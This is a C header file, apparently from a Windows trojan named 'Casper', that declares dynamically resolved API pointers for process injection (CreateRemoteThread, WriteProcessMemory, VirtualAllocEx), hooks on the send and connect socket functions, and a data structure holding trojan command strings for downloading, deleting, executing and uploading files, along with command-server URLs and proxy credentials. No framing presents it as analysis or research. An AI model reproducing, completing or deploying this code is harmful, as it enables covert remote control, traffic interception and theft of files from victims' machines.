#ifndef _CASPER_INJECT_H_
#define _CASPER_INJECT_H_

#include <stdio.h>
#include <windows.h>
#include <imagehlp.h>
#include <wininet.h>
#include <tlhelp32.h>


#define INJECT_SIZE	   8192
#define CONNECT		   0
#define SEND           1
// Delay in second to get commands
#define DELAY_TROJ		10
// Delay in second to inject a new process
#define DELAY_INJ		10

#pragma intrinsic (memcpy, memset, strcmp, strcpy, strlen)


// Type definitions of functions

// kernel32.dll
typedef	BOOL	(WINAPI *injCloseHandle)(HANDLE);
typedef HANDLE	(WINAPI *injCreateFile)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE	(WINAPI *injCreateFileMapping)(HANDLE, VOID*, DWORD, DWORD, DWORD, LPCTSTR);
typedef HANDLE	(WINAPI *injCreateMutex)(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR);
typedef BOOL	(WINAPI *injCreateProcess)(LPCTSTR, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef HANDLE	(WINAPI *injCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE  (WINAPI *injCreateToolhelp32Snapshot)(DWORD , DWORD);
typedef BOOL	(WINAPI *injDeleteFile)(LPCTSTR);
typedef VOID	(WINAPI *injExitThread)(DWORD dwExitCode);
typedef BOOL	(WINAPI *injFlushInstructionCache)(HANDLE, LPCVOID , DWORD);
typedef HANDLE	(WINAPI *injGetCurrentProcess)(VOID);
typedef DWORD	(WINAPI *injGetFileSize)(HANDLE, LPDWORD);
typedef DWORD   (WINAPI *injGetLastError)(VOID);
typedef HMODULE (WINAPI *injGetModuleHandle)(LPCTSTR);
typedef FARPROC	(WINAPI *injGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE	(WINAPI *injGetProcessHeap)(VOID);
typedef DWORD	(WINAPI *injGetTickCount)(VOID);
typedef LPVOID	(WINAPI *injHeapAlloc)(HANDLE, DWORD, DWORD);
typedef HANDLE	(WINAPI *injHeapCreate)(DWORD, DWORD, DWORD);
typedef LPVOID	(WINAPI *injHeapReAlloc)(HANDLE, DWORD, LPVOID, DWORD);
typedef HMODULE (WINAPI *injLoadLibrary)(LPCSTR);
typedef	LPVOID	(WINAPI *injMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, DWORD);
typedef	HANDLE	(WINAPI *injOpenFileMapping)(DWORD, BOOL, LPCTSTR);
typedef HANDLE  (WINAPI *injOpenMutex)(DWORD ,BOOL ,LPCTSTR);
typedef HANDLE	(WINAPI *injOpenProcess)(DWORD, BOOL, DWORD);
typedef VOID	(WINAPI *injOutputDebugString)(TCHAR*);
typedef BOOL    (WINAPI *injProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL    (WINAPI *injProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL	(WINAPI *injReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL	(WINAPI *injReleaseMutex)(HANDLE);
typedef VOID    (WINAPI *injSetLastError)(DWORD);
typedef void	(WINAPI *injSleep)(DWORD);
typedef LPVOID  (WINAPI *injVirtualAlloc)(LPVOID, DWORD, DWORD, DWORD);
typedef LPVOID  (WINAPI *injVirtualAllocEx)(HANDLE, LPVOID, DWORD, DWORD, DWORD);
typedef BOOL	(WINAPI *injVirtualFreeEx)(HANDLE, LPVOID, DWORD, DWORD);
typedef BOOL	(WINAPI *injVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);
typedef DWORD	(WINAPI *injVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, DWORD);
typedef DWORD	(WINAPI *injWaitForSingleObject)(HANDLE ,DWORD);
typedef BOOL	(WINAPI *injWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL	(WINAPI *injWriteProcessMemory)(HANDLE, LPVOID, LPVOID, DWORD, LPDWORD);

// msvcrt.dll 
typedef int		(WINAPI *inj_getpid)(void);
typedef void *  (WINAPI *injmalloc)(size_t);
typedef void *  (WINAPI *injrealloc)(void *, size_t);
typedef int		(WINAPI *injsprintf)(char *, const char *, ...);
typedef char*   (WINAPI *injstrchr)(const char *, int);
typedef int     (WINAPI *injstrncmp)(const char *, const char *, size_t);
typedef	char*	(WINAPI *injstrncpy)(char *, const char *, size_t);
typedef char*   (WINAPI *injstrtok)(char *, const char *);

// psapi.dll
typedef BOOL	(WINAPI *injEnumProcessModules)(HANDLE, HMODULE *, DWORD, LPDWORD);

// imagehlp.dll
typedef PVOID	(WINAPI *injImageDirectoryEntryToData)(IN LPVOID, IN BOOLEAN, IN USHORT, OUT PULONG);

// user32.dll
typedef BOOL    (WINAPI *injMessageBeep)(UINT);
typedef int		(WINAPI *injMessageBox)(HWND, LPCTSTR , LPCTSTR, UINT);

// ws2_32.dll
typedef int		(WINAPI *injConnect)(SOCKET, const struct sockaddr FAR*, int);
typedef char FAR *(WINAPI *injinet_ntoa)(struct in_addr);
typedef u_short (WINAPI *injntohs)(u_short);
typedef int		(WINAPI *injSend)(SOCKET, const char FAR *, int, int);

// shlwapi.dll
typedef LPTSTR  (WINAPI *injStrStr)(LPCTSTR, LPCTSTR);

// wininet.dll
typedef BOOL	  (WINAPI *injHttpAddRequestHeaders)(IN HINTERNET, IN LPCSTR, IN DWORD, IN DWORD);
typedef BOOL	  (WINAPI *injHttpEndRequest)(HINTERNET, LPINTERNET_BUFFERS, DWORD, DWORD);
typedef HINTERNET (WINAPI *injHttpOpenRequest)(IN HINTERNET, IN LPCSTR, IN LPCSTR, IN LPCSTR, IN LPCSTR, IN LPCSTR FAR *, IN DWORD, IN DWORD);
typedef BOOL	  (WINAPI *injHttpSendRequestEx)(IN HINTERNET, IN LPINTERNET_BUFFERS, OUT LPINTERNET_BUFFERS, IN DWORD, IN DWORD);
typedef BOOL	  (WINAPI *injInternetCloseHandle)(IN HINTERNET);
typedef	HINTERNET (WINAPI *injInternetConnect)(IN HINTERNET, IN LPCSTR, IN INTERNET_PORT, IN LPCSTR, IN LPCSTR, IN DWORD, IN DWORD, IN DWORD);
typedef HINTERNET (WINAPI *injInternetOpen)(IN LPCSTR, IN DWORD, IN LPCSTR, IN LPCSTR, IN DWORD);
typedef HINTERNET (WINAPI *injInternetOpenUrl)(IN HINTERNET, IN LPCSTR, IN LPCSTR, IN DWORD, IN DWORD, IN DWORD);
typedef BOOL	  (WINAPI *injInternetReadFile)(IN HINTERNET, IN LPVOID, IN DWORD, OUT LPDWORD);
typedef BOOL	  (WINAPI *injInternetWriteFile)(IN HINTERNET, IN LPCVOID, IN DWORD, OUT LPDWORD);


// Injected data structure
typedef struct InjectedData{	
	
	// kernel32.dll APIs
	injCloseHandle				fnCloseHandle;
	injCreateFile				fnCreateFile;
	injCreateMutex				fnCreateMutex;
	injCreateProcess			fnCreateProcess;
	injCreateRemoteThread		fnCreateRemoteThread;
	injCreateToolhelp32Snapshot	fnCreateToolhelp32Snapshot;
	injDeleteFile				fnDeleteFile;
	injExitThread				fnExitThread;			
	injGetFileSize				fnGetFileSize;
	injGetLastError				fnGetLastError;
	injGetModuleHandle			fnGetModuleHandle;
	injGetProcAddress			fnGetProcAddress;
	injGetProcessHeap			fnGetProcessHeap;
	injGetTickCount				fnGetTickCount;
	injHeapAlloc				fnHeapAlloc;
	injHeapCreate				fnHeapCreate;
	injHeapReAlloc				fnHeapReAlloc;
	injLoadLibrary				fnLoadLibrary;	
	injOpenMutex				fnOpenMutex;
	injOpenProcess				fnOpenProcess;
	injProcess32First			fnProcess32First;
	injProcess32Next			fnProcess32Next;
	injReadFile					fnReadFile;
	injReleaseMutex				fnReleaseMutex;
	injSetLastError				fnSetLastError;
	injSleep					fnSleep;
	injVirtualAlloc				fnVirtualAlloc;
	injVirtualAllocEx			fnVirtualAllocEx;
	injVirtualFreeEx			fnVirtualFreeEx;
	injWaitForSingleObject		fnWaitForSingleObject;
	injWriteFile				fnWriteFile;
	injWriteProcessMemory		fnWriteProcessMemory;
	
	// msvcrt.dll APIs
	injstrtok			fnstrtok;
	injstrncmp			fnstrncmp;
	injsprintf			fnsprintf;
	injmalloc			fnmalloc;
	injrealloc			fnrealloc;
	inj_getpid			fn_getpid;	

	// user32.dll APIs
	injMessageBeep		 fnMessageBeep;
	injMessageBox		 fnMessageBox;
	injOutputDebugString fnOutputDebugString;

	// shlwapi.dll APIs
	injstrchr			fnStrChr;
	injstrncpy			fnStrNCpy;
	injStrStr			fnStrStr;

	// wininet.dll APIs
	injHttpAddRequestHeaders fnHttpAddRequestHeaders;
	injHttpEndRequest		 fnHttpEndRequest;
	injHttpOpenRequest		 fnHttpOpenRequest;
	injHttpSendRequestEx	 fnHttpSendRequestEx;
	injInternetCloseHandle	 fnInternetCloseHandle;
	injInternetConnect		 fnInternetConnect;
	injInternetOpen			 fnInternetOpen;
	injInternetOpenUrl		 fnInternetOpenUrl;
	injInternetReadFile		 fnInternetReadFile;
	injInternetWriteFile	 fnInternetWriteFile;
	
	// ws2_32.dll APIs
	injConnect			fnConnectOriginal;
	injinet_ntoa		fninet_ntoa;
	injntohs			fnntohs;
	injSend				fnSendOriginal;

	// Injected function
	injSend				fnSendHook;
	injConnect			fnConnectHook;
	LPCVOID				fnInjectionFunc;
	LPCVOID				fnFunction;
	LPCVOID				fnTrojGetCmd;
	LPCVOID				fnTrojDownloader;
	LPCVOID				fnTrojMain;
	LPCVOID				fnTrojExec;
	LPCVOID				fnTrojUploader;

	// DLL name	
	TCHAR	lpImagehlp[13];
	TCHAR	lpKernel32[13];
	TCHAR	lpMsvcrt[11];
	TCHAR	lpPsapi[10];	
	TCHAR	lpShlwapi[12];	
	TCHAR	lpUser32[11];
	TCHAR	lpWs2_32[11];		
	TCHAR	lpWininet[12];	

	// Trojan specific strings
	TCHAR	lpTrojCmdFormat[8];
	TCHAR	lpTrojCmdDownload[9];
	TCHAR	lpTrojCmdDelfile[8];
	TCHAR	lpTrojCmdExecCMD[7];
	TCHAR	lpTrojCmdExecProg[9];
	TCHAR	lpTrojCmdUpload[7];		
	TCHAR	lpTrojLogFormatOK_A[16];	
	TCHAR	lpTrojLogFormatOK_B[13];
	TCHAR	lpTrojLogFormatERROR_A[19];
	TCHAR	lpTrojLogFormatERROR_B[16];
	TCHAR	lpTrojContentType[90];
	TCHAR	lpTrojMimeTail[180];
	TCHAR	lpTrojMimeHeader[160];
	TCHAR	lpTrojPOST[5];
	TCHAR	lpTrojGET[4];
	TCHAR	lpTrojContentLength[22];
	TCHAR   lpUserAgent[100];
	TCHAR	lpCMD_URL[100];
	TCHAR	lpRES_URL[100];
	TCHAR	lpSERVER[100];
	TCHAR	lpUP_URL[100];
	BOOL	bTrojGetCmd;

	// Proxy stuff
	TCHAR	lpAuthorization[255];
	TCHAR	lpProxyBanner[22];	
	TCHAR	lpProxyGET[12]; // GET http://	
	TCHAR	lpFormatProxy[20];
	BOOL	bProxy;
	BOOL	bProxyAuth;

	// API names array
	TCHAR	injFunction[70][255];

	// Others 		
	TCHAR	lpCmdTest[30];
	TCHAR   lpError[20];
	TCHAR	lpDebugConnect[20];
	TCHAR	lpDebugSend[20];
	TCHAR	lpReturn[2];
	TCHAR	lpSharedMemName[20];
	TCHAR	lpFormat[5];
	TCHAR	lpFormatDebug[3];		
	TCHAR   lpIP[20];
	TCHAR	lpMutexName[12];
	DWORD	dwSend;
	BYTE	*pMem[2];
	u_short uPort;		

} INJECTEDDATA;


// Type definitions of trojan functions
typedef LPTSTR (WINAPI *injTrojDownloader)(INJECTEDDATA *, LPTSTR, LPTSTR, BOOL);
typedef	int (WINAPI *injTrojExec)(INJECTEDDATA *, LPTSTR, LPTSTR, BOOL);
typedef int (WINAPI *injTrojGetCmd)(INJECTEDDATA *);
typedef int (WINAPI *injTrojMain)(INJECTEDDATA *, LPTSTR, LPTSTR, LPTSTR);
typedef int (WINAPI *injTrojUploader)(INJECTEDDATA *, LPTSTR, LPTSTR, LPTSTR);
typedef int (WINAPI *injInjectProcessI)(INJECTEDDATA *, DWORD);


// Functions prototype
void __forceinline FindKernel32();
void __forceinline GetProcFromKernel32(void* pKernel32, char* szProcName);
void __forceinline GetMyProcessData();
int __forceinline HookAPI(LPSTR lpLibrary, PROC lpOriginalApi, PROC lpHookedApi, INJECTEDDATA *pData, int offset, int num);
int WINAPI SendHook(SOCKET s, const char FAR * buf, int len, int flags);
int WINAPI ConnectHook(SOCKET s, const struct sockaddr FAR*  name, int namelen);
void WINAPI InjectedMain(INJECTEDDATA *pData);
int WINAPI InjectProcessI(INJECTEDDATA *pData, DWORD dwPID);


#endif // _CASPER_INJECT_H__
